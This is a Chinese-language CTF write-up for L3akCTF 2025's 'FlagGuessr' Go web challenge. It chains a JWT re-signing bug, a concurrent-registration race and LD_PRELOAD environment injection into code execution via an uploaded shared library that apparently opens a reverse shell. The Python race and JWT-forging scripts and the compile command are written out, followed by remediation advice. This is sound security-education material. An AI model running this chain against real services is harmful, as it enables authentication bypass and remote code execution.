# L3akCTF 2025 FlagGuessr Writeup

## 题目简述

`FlagGuessr` 是一个 Go Web 应用。注册时用户上传自己的 `flag.txt`，登录后可以猜测其他用户的 flag；个人资料页还能调用独立的 `makecert` 程序生成证书图片。

仓库中的长篇官方说明描述了 MD5 碰撞、管理员 XSS 和 SQLite `NOCASE` 的设计链，但比赛原版在注册逻辑中还存在更直接的并发竞态。该竞态能把攻击者提供的无效 JWT 重新签名，再通过 `LD_PRELOAD` 获得代码执行。本文按原版实际可用的最短链处理，归档为 Web。

## 解题过程

### 找到 JWT 重签名错误

`RequestMiddleware` 即使发现 JWT 签名无效，也会把已解析的 claims 返回：

```go
token, _ := jwt.ParseWithClaims(cookie.Value, &session, keyFunc)
valid := token != nil && token.Valid
return &session, valid, resp, nil
```

注册处理器只拒绝“有效且已登录”的 session，并无条件安排：

```go
defer session.UpdateSession(w)
```

成功插入新用户时，`session.InitSession(newUser)` 会覆盖攻击者 claims；但 `InsertUser()` 失败的分支没有调用 `session.ClearSession()`：

```go
err = newUser.InsertUser()
if err != nil {
    resp.Body = "/register?e=bad request"
    return
}
```

因此，只要让流程通过前面的可用性检查、最后却插入失败，服务器就会用真实随机 `jwtKey` 给攻击者原有 claims 签名。

### 用并发注册制造插入失败

原版没有注册锁。让多个请求同时注册完全相同的 `username` 和 `display_name`：

1. 多个请求先后读取用户表时，该用户名尚不存在，因此都通过 `CheckUsernameAvailable()`；
2. 第一个请求完成 `INSERT`；
3. 其余请求撞上 `(username, display_name)` 主键，进入未清空 session 的错误分支；
4. defer 逻辑给这些请求携带的攻击者 claims 签发有效 cookie。

先正常注册一个账号，并把兼容 Alpine/musl 的恶意共享库作为该账号的 `flag.txt` 上传。从正常 session 中可直接解码出它的 `user_id`。随后构造一个签名故意无效的 JWT：

```python
claims = {
    "username": "anything",
    "user_kind": 1,
    "user_id": payload_user_id,
    "properties": {
        "display_name": "solver",
        "description": "solver",
        "LD_PRELOAD": f"./userdata/{payload_user_id}/flag.txt",
    },
    "logged_in": True,
}

invalid = jwt.encode(claims, "wrong-key", algorithm="HS256")
```

用线程池同时发送 10 到 20 个注册请求：

```python
from concurrent.futures import ThreadPoolExecutor
import requests

def race_once():
    return requests.post(
        base + "/register",
        cookies={"session": invalid},
        files={
            "username": (None, race_name),
            "display_name": (None, race_name),
            "password": (None, "pw"),
            "flag": ("flag.txt", b"x", "application/octet-stream"),
        },
        allow_redirects=False,
    )

with ThreadPoolExecutor(max_workers=20) as pool:
    responses = list(pool.map(lambda _: race_once(), range(20)))
```

逐个无验签解码响应中的 `session` cookie。成功注册的响应会指向新用户；插入失败且触发漏洞的响应仍保留 `payload_user_id`，但此时签名已经由服务器生成。

### 通过 LD_PRELOAD 执行共享库

`/api/certificate` 把 session 的所有 `properties` 原样加入子进程环境：

```go
for k, v := range session.Properties {
    cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", k, v))
}
cmd.Run()
```

Go 编译的 `makecert` 本身未必经动态加载器处理，但它最后会执行外部命令：

```go
exec.Command("cp", temporaryPNG, certificatePath)
```

动态链接的 `cp` 会读取 `LD_PRELOAD`，从而加载上传在 `flag.txt` 位置的共享库。官方样例库在 `_init` 中建立反向 shell；编译时应使用与 Alpine 兼容的 musl 工具链：

```bash
musl-gcc -shared -fPIC -nostartfiles -o libpayload.so payload.c
```

带着竞态获得的有效 cookie 请求 `/api/certificate`，在回连 shell 中读取：

```bash
cat /app/flag.txt
```

得到：

```text
L3AK{c0llat3_n0c4s3_c4n_caus3_issue5_a7_tim3s}
```

flag 文本描述的是原先设计的 `COLLATE NOCASE` 链，但原版代码中并发重签路径更短；这也是后续 Revenge 版本加入全局注册 mutex 的原因。

## 方法总结

JWT 验签失败后不应继续使用已经解析的 claims，更不应在后续错误路径中重新签名。注册逻辑还把“检查是否可用”和“实际插入”分成两个未加锁步骤，典型的 TOCTOU 竞态让攻击者稳定触发预期之外的数据库错误。

最后的环境变量注入把认证漏洞升级为代码执行。应用不应把 session 中任意键值复制给子进程，尤其要清除 `LD_PRELOAD`、`LD_LIBRARY_PATH` 等动态加载器变量；使用外部 `cp` 也扩大了攻击面，普通文件复制完全可以在 Go 进程内完成。
